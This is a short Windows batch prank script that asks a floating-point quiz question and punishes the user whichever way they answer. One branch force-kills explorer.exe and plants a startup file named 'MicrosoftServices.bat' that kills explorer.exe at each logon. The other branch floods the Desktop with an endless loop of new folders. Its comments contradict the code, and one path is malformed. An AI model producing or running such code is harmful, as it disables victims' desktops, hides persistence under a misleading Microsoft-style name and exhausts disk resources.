@ECHO OFF
:start
SET choice=
SET /p choice= is 0.1 + 0.2 == 0.3 [Y/N]: 
IF NOT '%choice%'=='' SET choice=%choice:~0,1%
IF '%choice%'=='Y' GOTO yes
IF '%choice%'=='y' GOTO yes
IF '%choice%'=='N' GOTO no
IF '%choice%'=='n' GOTO no
IF '%choice%'=='' GOTO no
ECHO "%choice%" is not valid
ECHO.
GOTO start

::if the user chooses yes, it will open the github page
:no
ECHO :)
start "" 
    cd C:Documents and SettingsusernameDesktop
    :loop
        md %RANDOM%
    goto loop
PAUSE
EXIT
::if the user chooses no, it will do something evil to the user >:D
:yes
ECHO :(
:: kills the explorer.exe process
taskkill -f -im explorer.exe
:: opens the folder
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
:: makes a new file to the folder
type NUL>MicrosoftServices.bat
:: and writes the code to the file
@echo taskkill -f -im explorer.exe> MicrosoftServices.bat

PAUSE
EXIT


